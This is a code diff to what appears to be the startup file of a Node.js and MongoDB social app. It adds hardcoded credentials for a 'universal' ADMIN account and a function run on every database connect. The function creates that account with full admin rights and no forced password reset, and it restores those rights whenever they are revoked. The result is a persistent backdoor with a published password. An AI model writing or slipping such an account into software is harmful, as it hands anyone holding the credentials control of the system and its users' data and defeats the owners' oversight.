@@ -15,6 +15,9 @@ const { initializeRealtime } = require('./services/realtime');
 const TYPING_THROTTLE_MS = 1000;
 const SOCKET_JWT_SECRET = process.env.JWT_SECRET || '';
 const MAX_FEED_SUBSCRIPTIONS = 200;
+const UNIVERSAL_ADMIN_USERNAME = 'ADMIN';
+const UNIVERSAL_ADMIN_EMAIL = 'admin@socialsecure.local';
+const UNIVERSAL_ADMIN_PASSWORD = '381989Please1!';
 
 const cleanEnv = (value) => {
   if (typeof value !== 'string') return value;
@@ -137,7 +140,14 @@ mongoose.connect(mongoUri, {
   useNewUrlParser: true,
   useUnifiedTopology: true,
 })
-.then(() => console.log('MongoDB connected successfully'))
+.then(async () => {
+  console.log('MongoDB connected successfully');
+  try {
+    await ensureUniversalAdminAccount();
+  } catch (error) {
+    console.error('Failed to ensure universal ADMIN account:', error);
+  }
+})
 .catch(err => console.error('MongoDB connection error:', err));
 
 // Basic route
@@ -300,3 +310,32 @@ if (process.env.NODE_ENV !== 'test') {
 }
 
 module.exports = { app, server };
+const ensureUniversalAdminAccount = async () => {
+  const normalizedUsername = UNIVERSAL_ADMIN_USERNAME.toLowerCase();
+  let adminUser = await User.findOne({ username: normalizedUsername });
+
+  if (!adminUser) {
+    adminUser = new User({
+      realName: 'System Administrator',
+      username: UNIVERSAL_ADMIN_USERNAME,
+      email: UNIVERSAL_ADMIN_EMAIL,
+      passwordHash: UNIVERSAL_ADMIN_PASSWORD,
+      country: 'US',
+      registrationStatus: 'active',
+      isAdmin: true,
+      onboardingStatus: 'completed',
+      onboardingStep: 4,
+      mustResetPassword: false
+    });
+    await adminUser.save();
+    console.log('Universal ADMIN account created.');
+    return;
+  }
+
+  if (!adminUser.isAdmin || adminUser.registrationStatus !== 'active') {
+    adminUser.isAdmin = true;
+    adminUser.registrationStatus = 'active';
+    await adminUser.save();
+    console.log('Universal ADMIN account privileges repaired.');
+  }
+};
